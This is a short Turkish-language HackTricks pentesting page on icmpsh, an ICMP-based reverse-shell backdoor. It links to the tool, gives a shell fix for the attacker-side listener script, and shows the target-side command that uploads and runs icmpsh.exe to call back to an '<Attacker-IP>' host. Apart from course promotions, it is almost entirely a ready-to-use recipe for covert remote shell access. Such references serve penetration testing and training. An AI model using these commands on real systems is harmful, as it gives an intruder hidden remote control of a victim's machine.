{% hint style="success" %}
AWS Hacking'ı öğrenin ve uygulayın: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'ı öğrenin ve uygulayın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin.**
* **Hacking püf noktalarını paylaşarak PR'ler göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
{% endhint %}

Arka kapıyı şuradan indirin: [https://github.com/inquisb/icmpsh](https://github.com/inquisb/icmpsh)

# İstemci tarafı

Betik dosyasını çalıştırın: **run.sh**

**Bazı hatalar alırsanız, aşağıdaki satırları değiştirmeyi deneyin:**
```bash
IPINT=$(ifconfig | grep "eth" | cut -d " " -f 1 | head -1)
IP=$(ifconfig "$IPINT" |grep "inet addr:" |cut -d ":" -f 2 |awk '{ print $1 }')
```
**İçin:**
```bash
echo Please insert the IP where you want to listen
read IP
```
# **Hedef Taraf**

**icmpsh.exe** dosyasını hedefe yükle ve çalıştır:
```bash
icmpsh.exe -t <Attacker-IP> -d 500 -b 30 -s 128
```
{% hint style="success" %}
Öğren ve AWS Hacking pratiği yap:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Öğren ve GCP Hacking pratiği yap: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekle</summary>

* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol et!
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katıl veya [**telegram grubuna**](https://t.me/peass) katıl veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip et.**
* **Hacking püf noktalarını paylaşmak için PR göndererek HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulun.

</details>
{% endhint %}
